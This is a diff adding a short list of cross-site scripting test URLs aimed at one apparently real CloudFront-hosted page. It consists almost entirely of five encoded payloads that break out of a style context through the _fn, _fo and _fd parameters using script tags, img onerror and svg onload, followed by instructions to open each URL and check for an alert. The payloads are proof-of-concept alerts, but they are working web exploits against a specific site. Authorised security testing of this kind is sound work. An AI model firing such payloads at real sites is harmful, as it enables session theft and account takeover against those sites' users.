@@ -1,0 +1,21 @@
+XSS Escalation Test URLs
+=========================
+
+Test 1 - Break out with </style><script>:
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=%3C/style%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&_fo=y
+
+Test 2 - Break out via _fo parameter (in @import):
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_fo=x');%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cstyle%3E&_fn=test
+
+Test 3 - img onerror:
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E&_fo=y
+
+Test 4 - SVG onload:
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=%3C/style%3E%3Csvg%20onload=alert(1)%3E&_fo=y
+
+Test 5 - Via _fd parameter:
+https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x&_fo=y&_fd=%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+INSTRUCTIONS:
+Open each URL in browser and check if alert() fires.
+If YES = XSS = CRITICAL!
